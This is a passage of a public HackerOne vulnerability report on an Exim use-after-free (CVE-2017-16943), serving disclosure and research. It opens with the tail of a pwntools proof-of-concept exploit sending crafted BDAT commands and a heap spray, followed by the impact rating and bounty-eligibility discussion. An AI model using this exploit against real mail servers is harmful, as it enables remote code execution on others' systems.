class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x1280\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x7f\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvuntil\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;command\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;DATA\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvuntil\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;itself\u003c/span\u003e\u003cspan class=\"se\"\u003e\\r\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;b\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x4000\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\r\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\r\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\r\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvline\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;MAIL FROM:\u0026lt;\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvline\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;RCPT TO:\u0026lt;meh@some.domain\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvline\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x3480\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x7f\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvuntil\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;command\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;BDAT 1\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;:BDAT \u003c/span\u003e\u003cspan class=\"se\"\u003e\\x7f\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ep64\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0xdeadbeef\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x1e00\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\r\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003einteractive\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eA demo of our exploit is as below.\u003cbr\u003e\n![](\u003ca title=\"https://i.imgur.com/jumGJMG.png\" href=\"/redirect?url=https%3A%2F%2Fi.imgur.com%2FjumGJMG.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://i.imgur.com/jumGJMG.png\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003cbr\u003e\nNote that we have not found a way to leak memory address and therefore we use heap spray instead. It requires another information leakage vulnerability to overcome the PIE mitigation on x86-64.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eRemote code execution on remote mail server, affecting over 500k mail servers.\u003c/p\u003e\n","weakness":{"id":50,"name":"Use After Free"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T23:45:11.314Z","allow_singular_disclosure_after":-35617336.39275924,"singular_disclosure_allowed":true,"vote_count":5,"voters":["mehqq","checkm50","base_64","japz","srikar301"],"severity":{"rating":"critical","score":9.8,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2216020,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"CVE-2017-16943","markdown_message":"\u003cp\u003eCVE-2017-16943\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-12T02:42:09.514Z","updated_at":"2017-12-12T02:42:09.514Z","actor":{"username":"mehqq","cleared":false,"url":"/mehqq","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/223/779/2feea3759da1e6d5b594b5096db68d21cf917004_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"internet","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2216540,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Sorry @mehqq, but we are not able to include exim in scope for the IBB at this time.","markdown_message":"\u003cp\u003eSorry \u003ca href=\"/mehqq\"\u003e@mehqq\u003c/a\u003e, but we are not able to include exim in scope for the IBB at this time.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-12T07:13:50.609Z","updated_at":"2017-12-12T07:13:50.609Z","actor":{"url":"/internet","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/e3e1c58882b2645d9108ec102731a354cbf5852e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"The Internet"}},"genius_execution_id":null,"team_handle":"internet","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2216541,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-12T07:13:56.407Z","updated_at":"2017-12-12T07:13:56.407Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"mehqq","url":"/mehqq"},"genius_execution_id":null,"team_handle":"internet","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2216542,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-12T07:14:16.793Z","updated_at":"2017-12-12T07:14:16.793Z","cve_ids":["CVE-2017-16943"],"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"internet","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2216784,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, could you tell me why exim is not included? According to the [survey] (http://www.securityspace.com/s_survey/data/man.201711/mxsurvey.html), over half of mail servers (570,616) are running exim. It fits all criteria listed: **a vendor with dominant market share, and open source.**\nAlso, the additional criteria are fit:\n**Be widespread (500k servers and millions users may be affected), Have critical impact (PreAuth Remote code execution), Be novel (Complicated vulnerability).**\nI am confused about why this is not included.\nThanks.\n","markdown_message":"\u003cp\u003eHi, could you tell me why exim is not included? According to the \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.securityspace.com%2Fs_survey%2Fdata%2Fman.201711%2Fmxsurvey.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esurvey\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, over half of mail servers (570,616) are running exim. It fits all criteria listed: \u003cstrong\u003ea vendor with dominant market share, and open source.\u003c/strong\u003e\u003cbr\u003e\nAlso, the additional criteria are fit:\u003cbr\u003e\n\u003cstrong\u003eBe widespread (500k servers and millions users may be affected), Have critical impact (PreAuth Remote code execution), Be novel (Complicated vulnerability).\u003c/strong\u003e\u003cbr\u003e\nI am confused about why this is not included.\u003cbr\u003e\nThanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-12T09:26:53.481Z","updated_at":"2017-12-12T09:26:53.481Z","actor":{"username":"mehqq","cleared":false,"url":"/mehqq","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/223/779/2feea3759da1e6d5b594b5096db68d21cf917004_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"internet","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6028938,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T23:45:11.260Z","updated_at":"2019-10-13T23:45:11.260Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"internet","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6293036,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T23:45:11.613Z","updated_at":"2019-11-12T23:45:11.613Z","actor":{"url":"/internet","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/e3e1c58882b2645d9108ec102731a354cbf5852e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"The Internet"}},"genius_execution_id":null,"team_handle":"internet","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}